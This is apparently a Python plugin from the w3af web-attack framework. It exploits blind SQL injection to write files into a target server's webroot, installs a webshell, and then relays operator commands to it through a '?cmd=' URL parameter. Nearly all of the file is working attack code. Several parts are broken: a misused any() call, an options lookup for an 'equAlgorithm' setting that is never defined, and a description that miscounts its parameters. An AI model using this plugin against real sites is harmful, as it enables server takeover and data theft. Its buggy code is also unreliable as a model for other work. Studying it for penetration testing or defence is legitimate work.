'''
sql_webshell.py

Copyright 2006 Andres Riancho

This file is part of w3af, w3af.sourceforge.net .

w3af is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

w3af is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with w3af; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

'''

import urllib

import core.data.kb.knowledgeBase as kb
import core.data.kb.vuln as vuln

import core.controllers.outputManager as om

import plugins.attack.payloads.shell_handler as shell_handler

from core.data.request.HTTPPostDataRequest import HTTPPostDataRequest
from core.data.request.HTTPQsRequest import HTTPQSRequest
from core.data.parsers.url import parse_qs
from core.data.fuzzer.fuzzer import create_mutants, rand_alnum
from core.data.kb.shell import shell as shell
from core.data.options.option import option
from core.data.options.option_list import OptionList

from core.controllers.plugins.attack_plugin import AttackPlugin
from core.controllers.w3afException import w3afException
from core.controllers.sql_tools.blind_sqli_response_diff import blind_sqli_response_diff
from core.controllers.misc.webroot import get_webroot_dirs

from plugins.attack.db.dbDriverBuilder import dbDriverBuilder as dbDriverBuilder
from plugins.attack.payloads.decorators.exec_decorator import exec_debug


class sql_webshell(AttackPlugin):
    '''
    Exploits [blind] sql injections by uploading a webshell to the target webroot.
    '''
    
    def __init__(self):
        AttackPlugin.__init__(self)
        
        # Internal variables
        self._vuln = None
        self._driver = None
        
        # User configured options for fastExploit
        self._url = ''
        self._method = 'GET'
        self._data = ''
        self._injvar = ''
        
        # User configured variables
        self._eq_limit = 0.9
        self._goodSamaritan = True
        self._generate_only_one = True
        
    def fastExploit( self ):
        '''
        Exploits a web app with [blind] sql injections vulns.
        The options are configured using the plugin options and set_options() method.
        '''
        om.out.debug( 'Starting sql_webshell fastExploit.' )
        
        if any(
             lambda attr: attr is None,
             (self._url, self._method, self._data, self._injvar)
             ):
            raise w3afException('You have to configure the plugin parameters')
        else:
            if self._method == 'POST':
                freq = HTTPPostDataRequest(self._url)
            elif self._method == 'GET':
                freq = HTTPQSRequest(self._url)
            else:
                raise w3afException('Method not supported.')
            
            freq.setDc(parse_qs(self._data))

            bsql = blind_sqli_response_diff(self._uri_opener)
            bsql.set_eq_limit(self._eq_limit)
            
            fake_mutants = create_mutants(freq, [''], fuzzable_param_list=[self._injvar,])
            for mutant in fake_mutants:            
                vuln_obj = bsql.is_injectable(mutant)
                if vuln_obj is not None:
                    om.out.console('SQL injection verified, trying to create the DB driver.')
                    
                    # Try to get a shell using all vuln
                    msg = 'Trying to exploit using vulnerability with id: ' + str(vuln_obj.getId())
                    msg += '. Please wait...'
                    om.out.console(msg)
                    shell_obj = self._generate_shell(vuln_obj)
                    if shell_obj is not None:
                        kb.kb.append(self, 'shell', shell_obj)
                        return [shell_obj, ]
            else:    
                raise w3afException('No exploitable vulnerabilities found.')

            
    def getAttackType(self):
        '''
        @return: The type of exploit, SHELL, PROXY, etc.
        '''        
        return 'shell'
    
    def getExploitableVulns(self):
        vulns = list(kb.kb.get('blind_sqli', 'blind_sqli'))
        vulns.extend(kb.kb.get('sqli', 'sqli'))
        return vulns

    def canExploit( self, vulnToExploit=None ):
        '''
        Searches the kb for vulnerabilities that the plugin can exploit.

        @return: True if plugin knows how to exploit a found vuln.
        '''
        vulns = self.getExploitableVulns()

        if vulnToExploit is not None:
            vulns = [ v for v in vulns if v.getId() == vulnToExploit ]
            
        if len(vulns) != 0:
            return True
        else:
            om.out.console( 'No [blind] SQL injection vulnerabilities have been found.' )
            om.out.console( 'Hint #1: Try to find vulnerabilities using the audit plugins.' )
            msg = 'Hint #2: Use the set command to enter the values yourself, and then exploit it using fastExploit.'
            om.out.console( msg )
            return False

    def exploit( self, vulnToExploit=None ):
        '''
        Exploits a [blind] sql injections vulns that was found and stored in the kb.

        @return: True if the shell is working and the user can start calling specific_user_input
        '''
        if not self.canExploit():
            return []
        else:
            vulns = list(kb.kb.get( 'blind_sqli' , 'blind_sqli'))
            vulns.extend(kb.kb.get( 'sqli' , 'sqli' ))
            
            bsql = blind_sqli_response_diff(self._uri_opener)
            bsql.set_eq_limit( self._eq_limit )
            
            tmp_vuln_list = []
            for v in vulns:
            
                # Filter the vuln that was selected by the user
                if vulnToExploit is not None:
                    if vulnToExploit != v.getId():
                        continue
            
                mutant = v.getMutant()
                mutant.setModValue( mutant.getOriginalValue() )
                v.setMutant( mutant )
            
                # The user didn't selected anything, or we are in the selected vuln!
                om.out.debug('Verifying vulnerability in URL: "' + v.getURL() + '".')
                vuln_obj = bsql.is_injectable( v.getMutant() )
                if vuln_obj:
                    tmp_vuln_list.append( vuln_obj )
            
            # Ok, go to the next stage with the filtered vulnerabilities
            vulns = tmp_vuln_list
            if len(vulns) == 0:
                om.out.debug('is_injectable failed for all vulnerabilities.')
                return []
            else:
                for vuln_obj in vulns:
                    # Try to get a shell using all vuln
                    msg = 'Trying to exploit using vulnerability with id: ' + str( vuln_obj.getId() )
                    msg += '. Please wait...' 
                    om.out.console( msg )
                    shell_obj = self._generate_shell( vuln_obj )
                    if shell_obj:
                        if self._generate_only_one:
                            # A shell was generated, I only need one point of exec.
                            return [shell_obj, ]
                        else:
                            # Keep adding all shells to the kb
                            pass
                
                return kb.kb.get( self.getName(), 'shell' )
                
    def _generate_shell( self, vuln_obj ):
        '''
        @parameter vuln_obj: The vuln to exploit, as it was saved in the kb or 
                             supplied by the user with set commands.
        @return: A sql_webshell shell object if sql_webshell could fingerprint 
                 the database.
        '''
        bsql = blind_sqli_response_diff(self._uri_opener)
        bsql.set_eq_limit( self._eq_limit )
            
        dbBuilder = dbDriverBuilder( self._uri_opener, bsql.equal_with_limit )
        driver = dbBuilder.getDriverForVuln( vuln_obj )
        if driver is None:
            return None
        else:
            # We have a driver, now, using this driver, we have to create the webshell in the
            # target's webroot!
            webshell_url = self._upload_webshell( driver, vuln_obj )
            if webshell_url:
                # Define the corresponding cut...
                response = self._uri_opener.GET( webshell_url )
                self._define_exact_cut( response.getBody(), shell_handler.SHELL_IDENTIFIER )
                
                # Create the shell object
                # Set shell parameters
                shell_obj = sql_web_shell( vuln_obj )
                shell_obj.set_url_opener( self._uri_opener )
                shell_obj.setWebShellURL( webshell_url )
                shell_obj.set_cut( self._header_length, self._footer_length )
                kb.kb.append( self, 'shell', shell_obj )
                return shell_obj
            else:
                # Sad face :(
                return None
    
    def _upload_webshell(self, driver, vuln_obj):
        '''
        First, upload any file to the target webroot.
        
        Once I've found the target webroot (or any other location inside the webroot where I can
        write a file) try to upload a webshell and test for execution.
        
        @parameter driver: The database driver to use in order to upload the file.
        @parameter vuln_obj: The vulnerability that we are exploiting.
        
        @return: The webshell URL if the webshell was uploaded, or None if the process failed.
        '''
        upload_success = False
        
        # First, we test if we can upload a file into a directory we can access:
        webroot_dirs = get_webroot_dirs( vuln_obj.getURL().getDomain() )
        for webroot in webroot_dirs:
            
            if upload_success: break
            
            # w3af found a lot of directories, and we are going to use that knowledgeBase
            # because one of the dirs may be writable and one may not!
            for path in self._get_site_directories():
                
                # Create the remote_path
                remote_path = webroot + '/' + path
                
                # Create the filename
                remote_filename = rand_alnum( 8 ) + '.' + rand_alnum(3)
                remote_path += '/' + remote_filename
                # And just in case... remove double slashes
                for i in xrange(3): remote_path = remote_path.replace('//', '/')
                
                # Create the content (which will also act as the test_string)
                test_string = content = rand_alnum(16)
            
                # Create the test URL
                test_url = vuln_obj.getURL().urlJoin( path + '/' + remote_filename )

                if self._upload_file( driver, remote_path, content, test_url, test_string):
                    upload_success = True
                    om.out.console('Successfully wrote a file to the webroot.')
                    break
        
        # We can upload files, and we know where they are uploaded, now we
        # just need to upload a webshell that works in that environment!
        if upload_success:
            
            om.out.console('Trying to write a webshell.')
            
            # Get the extension from the vulnerable script
            extension = vuln_obj.getURL().getExtension()
            
            for file_content, real_extension in shell_handler.get_webshells( extension ):
                
                # Create the variables to upload the file, based on the success of the
                # previous for loop:
                remote_path = remote_path[:remote_path.rfind('/')]
                filename = rand_alnum( 8 )
                remote_path += '/' + filename + '.' + real_extension
                
                # And now do "the same thing" with the URL
                test_url = test_url[:test_url.rfind('/')]
                test_url += '/' + filename + '.' + real_extension + '?cmd='
                
                # Upload & test
                if self._upload_file( driver, remote_path, file_content, test_url, shell_handler.SHELL_IDENTIFIER):
                    # Complete success!
                    om.out.console('Successfully installed a webshell in the target server!')
                    return test_url
                    
        return None
            
    def _upload_file(self, driver, remote_path, content, test_url, test_string):
        '''
        Uploads a file to the target server, to the remote_path using the given SQL driver.
        
        The content of the file is "content", and check if it was successfully uploaded using a
        GET request to test_url and searching for the test_string string.
        
        @return: True if the file was uploaded.
        '''
        msg = 'Writing "' + content + '" to "' + remote_path +'" and searching it at: "'
        msg += test_url +'".'
        om.out.debug( msg )
        
        try:
            driver.writeFile( remote_path , content )
            response = self._uri_opener.GET( test_url )
        except Exception, e:
            om.out.error('Exception raised while uploading file: "' + str(e) + '".')
            return False
        else:
            if test_string in response.getBody():
                return True
            else:
                return False
    
    def _get_site_directories(self):
        '''
        @return: A list of the website directories.
        '''
        url_list = kb.kb.get('urls','url_objects')
        url_list = [ i.getPathWithoutFile() for i in url_list ]
        url_list = list(set(url_list))
        return url_list
    
    def get_options( self ):
        '''
        @return: A list of option objects for this plugin.
        '''
        ol = OptionList()
        
        d = 'URL to exploit with fastExploit()'
        o = option('url', self._url, d, 'url')
        ol.add(o)        
        
        d = 'Method to use with fastExploit()'
        o = option('method', self._method, d, 'string')
        ol.add(o)
        
        d = 'Data to send with fastExploit()'
        o = option('data', self._data, d, 'string')
        ol.add(o)
        
        d = 'Variable where to inject with fastExploit()'
        o = option('injvar', self._injvar, d, 'string')
        ol.add(o)
        
        d = 'Set the equal limit variable'
        h = 'Two pages are equal if they match in more than equalLimit. Only used when'
        h += ' equAlgorithm is set to setIntersection.'
        o = option('equalLimit', self._eq_limit, d, 'float', help=h)
        ol.add(o)
        
        d = 'Enable or disable the good samaritan module'
        h = 'The good samaritan module is a the best way to speed up blind sql exploitations.'
        h += ' It\'s really simple, you see messages in the console that show the status of the'
        h += ' crawl and you can help the process. For example, if you see "Micros" you'
        h += ' could type "oft", and if it\'s correct, you have made your good action of the day'
        h += ', speeded up the crawl AND had fun doing it.'
        o = option('goodSamaritan', self._goodSamaritan, d, 'boolean', help=h)
        ol.add(o)
        
        d = 'If true, this plugin will try to generate only one shell object.'
        o = option('generateOnlyOne', self._generate_only_one, d, 'boolean')
        ol.add(o)
        
        return ol


    def set_options( self, options_list ):
        '''
        This method sets all the options that are configured using the user interface 
        generated by the framework using the result of get_options().
        
        @parameter options_list: A map with the options for the plugin.
        @return: No value is returned.
        '''
        self._url = options_list['url'].getValue().uri2url()
            
        if options_list['method'].getValue() not in ['GET', 'POST']:
            raise w3afException('Unknown method.')
        else:
            self._method = options_list['method'].getValue()

        self._data = options_list['data'].getValue()
        self._injvar = options_list['injvar'].getValue()
        self._equAlgorithm = options_list['equAlgorithm'].getValue()
        self._eq_limit = options_list['equalLimit'].getValue()
        self._goodSamaritan = options_list['goodSamaritan'].getValue()
        self._generate_only_one = options_list['generateOnlyOne'].getValue()
    
    def getRootProbability( self ):
        '''
        @return: This method returns the probability of getting a root shell
                 using this attack plugin. This is used by the "exploit *"
                 function to order the plugins and first try to exploit the
                 more critical ones. This method should return 0 for an exploit
                 that will never return a root shell, and 1 for an exploit that
                 WILL ALWAYS return a root shell.
        '''
        return 0.1

    def get_long_desc( self ):
        '''
        @return: A DETAILED description of the plugin functions and features.
        '''
        return '''
        This plugin exploits [blind] sql injections.
        
        The original sql_webshell program was coded by Bernardo Damele and Daniele Bellucci, many thanks to both of
        them.
        
        Six configurable parameters exist:
            - url
            - method
            - data
            - injvar
            - equalLimit
        '''

class sql_web_shell(shell):
    def setWebShellURL( self, eu ):
        self._webshell_url = eu
    
    def getWebShellURL( self ):
        return self._webshell_url
    
    @exec_debug
    def execute( self, command ):
        '''
        This method is called when a user writes a command in the shell and hits enter.
        
        Before calling this method, the framework calls the generic_user_input method
        from the shell class.

        @parameter command: The command to handle ( ie. "read", "exec", etc ).
        @return: The result of the command.
        '''
        to_send = self.getWebShellURL() + urllib.quote_plus( command )
        response = self._uri_opener.GET( to_send )
        return self._cut(response.getBody())
    
    def end( self ):
        om.out.debug('sql_web_shell cleanup complete.')
        
    def getName( self ):
        return 'sql_web_shell'
